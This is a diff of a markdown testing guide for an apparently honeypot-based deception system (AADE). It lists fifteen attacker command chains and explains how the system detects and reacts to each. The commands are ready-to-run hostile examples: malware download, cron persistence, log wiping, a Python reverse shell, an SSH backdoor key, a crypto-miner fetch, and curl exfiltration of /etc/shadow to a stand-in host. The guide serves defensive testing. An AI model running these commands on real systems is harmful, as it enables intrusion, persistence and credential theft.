@@ -99,90 +99,165 @@ This guide provides a comprehensive walkthrough for testing the **AADE's Adaptiv
 ### 🛠️ Phase A: Discovery & Staging (Bot-Heavy / Tier 1)
 *Initial capture and environment mapping.*
 
+---
+
 **(01)-(System Reconnaissance)-(L1)**
-`whoami; id; uname -a`
-This is the "First Contact" chain. Attackers (human or bot) immediately attempt to verify their privilege (root vs. user) and the machine's architecture. `uname -a` reveals the kernel version, which informs the choice of subsequent local exploit attempts.
-**Cowrie Reaction:** The low-interaction honeypot provides a standard response, logging the user's IP and basic intent. Since this is non-destructive, the system remains in the lightweight Cowrie environment.
+```bash
+whoami; id; uname -a
+```
+**Description:** The "First Contact" chain used to verify user privileges and system architecture. This allows the attacker to determine if they are root and identify the kernel version for targeted local exploits.
+**Reaction:** AADE provides standard fake responses, logging the IP and command sequence while maintaining a lightweight footprint.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
+
+---
 
 **(02)-(Network Enumeration)-(L1)**
-`netstat -antp; route -n`
-Here, the attacker is mapping the internal network topology. They are looking for open ports (like database or internal service ports) and checking if the machine has a gateway to other internal subnets. It's a precursor to lateral movement.
-**Cowrie Reaction:** AADE presents a "believable" fake network routing table. The TTP Mapper flags this as **T1016 (System Network Configuration Discovery)**.
+```bash
+netstat -antp; route -n
+```
+**Description:** An attempt to map the internal network topology. Attackers look for active connections, open internal services, and routing paths to other subnets for lateral movement.
+**Reaction:** AADE serves a believable fake network interface and routing table. The TTP Mapper flags this as **T1016 (System Network Configuration Discovery)**.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
+
+---
 
 **(03)-(Service & OS Fingerprinting)-(L1)**
-`cat /etc/os-release; ls /etc/init.d`
-Attackers check the exact Linux distribution (e.g., Debian vs. CentOS) to ensure their binary payloads are compatible. Checking `/etc/init.d` helps identify what services (web servers, databases) are running and how they are managed (SystemV vs. SystemD).
-**Cowrie Reaction:** Provides a fake Debian environment. High-frequency probes here often indicate an automated botnet script scanning for specific vulnerable OS versions.
+```bash
+cat /etc/os-release; ls /etc/init.d
+```
+**Description:** Probing for the exact Linux distribution (e.g., Debian, Alpine) and running services. Identifying the init system (SystemD vs SystemV) helps the attacker tailor their persistence scripts.
+**Reaction:** Provides a fake OS release file. High-frequency automated probes at this stage are typically filtered as low-priority bot noise.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
+
+---
 
 **(04)-(Credential Preparation)-(L2)**
-`cat /etc/passwd; find / -name "*.history"`
-The goal is to gather a list of valid usernames for further brute-forcing or to find plaintext secrets inadvertently left in bash histories or backup files. This is a critical step for Privilege Escalation.
-**Cowrie Reaction:** Detection marks this as **T1003 (OS Credential Dumping)**. If the attacker starts searching for sensitive files intensely, the RL agent increases the "Aggression Score."
+```bash
+cat /etc/passwd; find / -name "*.history"
+```
+**Description:** Searching for user accounts and plaintext secrets inadvertently stored in Bash history or configuration backups. This is a critical step for credential harvesting and privilege escalation.
+**Reaction:** Logged as **T1003 (OS Credential Dumping)**. The RL agent increases the "Adversary Risk Score" based on the depth of the recursive search.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
+
+---
 
 **(05)-(External Payloading)-(L2)**
-`wget http://example.com/malware.sh -O /tmp/malware.sh`
-The attacker is attempting to bring in external tools. This is a major behavioral transition. Until now, the attacker has been using native binaries; now, they are introducing custom logic to the environment.
-**Cowrie Reaction:** The file is "downloaded" into the honeypot's virtual storage. This action is a high-priority trigger that moves the session closer to an Adaptive Shift.
+```bash
+wget http://example.com/malware.sh -O /tmp/malware.sh
+```
+**Description:** Attempting to download external malicious tools or second-stage payloads. This marks a transition from native recon to introducing custom attacker logic.
+**Reaction:** The file is virtually cached. This behavior acts as a primary trigger, moving the session to the threshold of a High-Interaction shift.
+**Trigger:** **Bot Environment** (Cowrie Low-Interaction).
 
 ---
 
 ### ⚡ Phase B: Interactive Escalation (Human-Centric / Tier 2)
 *High-risk behaviors that indicate manual control.*
 
+---
+
 **(06)-(Sudo Privilege Probe)-(L2)**
-`sudo -l`
-By running `sudo -l`, a human attacker checks if their guest account has any password-less execution rights or misconfigurations. This is rarely done by simple bots but is a standard operating procedure for human hackers.
-**Adaptive Trigger:** The intent to gain root via misconfiguration signifies a persistent threat. The Orchestrator prepares the **Firecracker MicroVM** for an imminent handoff to provide a "real" escalation path.
+```bash
+sudo -l
+```
+**Description:** Checking for password-less sudo permissions or misconfigured bin rights. This is a manual human procedure used to find a quick path to root sovereignty.
+**Reaction:** The Orchestrator intercepts this high-intent command and prepares the **Firecracker MicroVM** to give the attacker a "real" (but sealed) escalation path.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(07)-(Automated Persistence)-(L3)**
-`(crontab -l ; echo "*/15 * * * * /tmp/malware.sh") | crontab -`
-The attacker is ensuring they "stay" in the system. By adding a entry to the system scheduler (cron), they ensure their malware restarts automatically even if the honeypot is refreshed or the system reboots.
-**Reaction:** AADE logs this as **T1053.003 (Scheduled Task/Job)**. This level of persistence behavior usually marks the end of simple bot activity and the start of a "Session Hijack" protection.
+```bash
+(crontab -l ; echo "*/15 * * * * /tmp/malware.sh") | crontab -
+```
+**Description:** Installing a persistent backdoor via the system scheduler (Cron). This ensures the attacker gains access even if the honeypot session is reset or the server reboots.
+**Reaction:** Classified as **T1053.003 (Scheduled Task/Job)**. The system transitions the attacker to a real cron-capable environment to observe their persistent payload execution.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(08)-(Anti-Forensics / Trace Removal)-(L3)**
-`rm -rf /var/log/syslog; unset HISTFILE`
-The attacker is trying to hide. Deleting system logs and unsetting the history file (`HISTFILE`) are classic "Covering Tracks" techniques used by skilled humans to avoid detection by incident response teams.
-**MicroVM Shift:** This "Cleaning" attempt is a perfect deception opportunity. AADE performs a live migration to a MicroVM where it presents "real" logs that the attacker can delete, making them believe their invasion is now invisible.
+```bash
+rm -rf /var/log/syslog; unset HISTFILE
+```
+**Description:** Deleting system logs and disabling command history tracking. This is a classic "Covering Tracks" technique used by skilled human operators to evade incident response teams.
+**Reaction:** The system presents a real filesystem where the attacker believe they have deleted the logs, while AADE continues logging every keystroke out-of-band via VSOCK.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(09)-(Process Camouflage Monitor)-(L3)**
-`ps aux | grep -v "malware"`
-The attacker is self-auditing. They are running a process list to ensure their tools aren't being monitored or that other competing attackers haven't already compromised the box. The `grep -v` filter specifically hides their own activity from their view.
-**MicroVM Reaction:** The MicroVM environment provides a real, high-perf process tree. The **AF_VSOCK** listener captures this filtered search as a high-intent signal for advanced evasion.
+```bash
+ps aux | grep -v "malware"
+```
+**Description:** Searching the process tree while filtering out their own malware. Attackers use this to monitor for security agents or competing hackers without exposing their own presence.
+**Reaction:** The MicroVM provides a real High-Interaction process tree. The AF_VSOCK listener logs this stealthy self-audit as an indicator of advanced evasion.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(10)-(Direct Kernel Callback / Reverse Shell)-(L4)**
-`python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'`
-One of the most dangerous commands: a Python-based reverse shell. It sends an interactive command-line stream back to the attacker's machine, effectively bypassing simple inbound firewalls.
-**Honeywall Reaction:** Inside the MicroVM, this connection is intercepted. Instead of reaching the internet, it hits the **C2 Sinkhole**, allowing us to monitor the attacker's "Remote Control" commands in total isolation.
+```bash
+python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+```
+**Description:** Establishing a Python-based interactive reverse shell. This sends a command-line stream back to the attacker's server, bypassing simple inbound firewall blocks.
+**Reaction:** The MicroVM allows the connection, but the **Honeywall** routes it to our **C2 Sinkhole**, allowing us to record the attacker's "Remote Control" session in total isolation.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
 
 ---
 
 ### 💀 Phase C: Deep Deception & Impact (APT / Tier 3)
 *Simulating the final stages of a high-value breach.*
 
+---
+
 **(11)-(Credential Persistence / SSH Keys)-(L4)**
-`ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys`
-The attacker is installing their own "Backdoor Key." This allows them to log back into the server without a password at any time. It's a high-confidence indicator of an intent to use this machine as a "pivoting host" for the rest of the network.
-**Reaction:** The LLM Synthesizer injects these keys into the "Real" filesystem within the MicroVM, validating the attacker's success while we map the key fingerprint for cross-victim tracking.
+```bash
+ssh-keygen -t rsa -b 4096; cat ~/.ssh/id_rsa.pub >> ~/.ssh/authorized_keys
+```
+**Description:** Generating and installing an SSH Public Key for permanent, password-less backdoor access. This indicates an intent to use the server as a long-term staging post.
+**Reaction:** The LLM Synthesizer injects these keys into the "Real" home directory of the MicroVM, validating the attacker's TTPs while we extract the public key for forensic tracking.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(12)-(Ransomware Deployment Flow)-(L4)**
-`gpg --symmetric --cipher-algo AES256 important_data.tar`
-The attacker is performing native encryption for impact. GPG is often used to encrypt the entire data directory. They believe they are holding the server's data hostage.
-**Synthesis Trigger:** AADE populates the gold image directory with LLM-generated documents (e.g., `payroll_2025.csv`, `source_code.zip`). The attacker encrypts these **fake** high-value artifacts, confirming the "Impact" tactic on the dashboard.
+```bash
+gpg --symmetric --cipher-algo AES256 important_data.tar
+```
+**Description:** Encrypting high-value archives using AES-256 via GPG. This simulates the impact phase where attackers hold sensitive corporate data hostage for ransom.
+**Reaction:** AADE populates the image with LLM-generated fake data (SQL backups, payroll PDFs). The attacker encrypts these **fake** artifacts, confirming the "Impact" tactic on the dashboard.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(13)-(Resource Mining / Hijacking)-(L4)**
-`curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &`
-The attacker is turning the server into a "Profit Center." Using `xmrig` to mine cryptocurrency (like Monero) consumes high CPU but generates revenue for the attacker.
-**Control Reaction:** The MicroVM's CPU is throttled to 10% to prevent host impact, while the dashboard renders a "Resource Hijacking" alert with the specific miner configuration caught from the command line.
+```bash
+curl -LO http://miner.pool/xmrig; chmod +x xmrig; ./xmrig -o pool.com &
+```
+**Description:** Downloading and deploying a cryptocurrency miner (XMRig) to hijack system CPU resources for illicit profit.
+**Reaction:** The MicroVM's CPU is hardware-throttled to 10% to protect the host, while the dashboard triggers a "Resource Hijacking" alert with the full mining pool configuration.
+**Trigger:** **Human Environment** (Adaptive Firecracker Shift).
+
+---
 
 **(14)-(Kernel Escape Discovery)-(L5)**
-`sysctl -w kernel.panic=1; cat /proc/kcore`
-An extremely advanced APT-level behavior. The attacker is probing kernel core memory and trying to force a system crash to test if they can "break out" of the container or VM into the host operating system.
-**Deep Deception:** The MicroVM runs a real kernel, so these commands return real, terrifying outputs to the attacker, but the **Honeywall** and **KVM Isolation** ensure the host remains 100% safe.
+```bash
+sysctl -w kernel.panic=1; cat /proc/kcore
+```
+**Description:** Probing kernel memory and forcing system crashes to identify virtualization escapes. This is an extremely invasive technique used only by high-level APT actors.
+**Reaction:** The MicroVM's real kernel provides valid (but isolated) responses. KVM isolation ensures these "Escape" attempts have zero impact on the host operating system.
+**Trigger:** **Human Environment** (Deep High-Interaction).
+
+---
 
 **(15)-(Covert Exfiltration & Network Pivot)-(L5)**
-`curl --data-binary @/etc/shadow http://exfil.server/upload`
-The final "smash and grab." The attacker is exfiltrating the encrypted system passwords (`/etc/shadow`) using a binary HTTP POST. This is a deliberate attempt to crack user passwords offline and move to the next machine in the enterprise.
-**Analysis:** The C2 Sinkhole captures the raw binary data stream. We now have a copy of the specific exfiltration protocol the attacker uses, which can be shared as an **IOC (Indicator of Compromise)**.
+```bash
+curl --data-binary @/etc/shadow http://exfil.server/upload
+```
+**Description:** Exfiltrating sensitive system files (the password shadow file) via a binary HTTP POST stream. This is a final attempt to harvest passwords for lateral enterprise movement.
+**Reaction:** The C2 Sinkhole captures the raw binary exfiltration stream, providing us with a copy of the attacker's protocol and the specific destination IOC.
+**Trigger:** **Human Environment** (Deep High-Interaction).
 
 ---
 
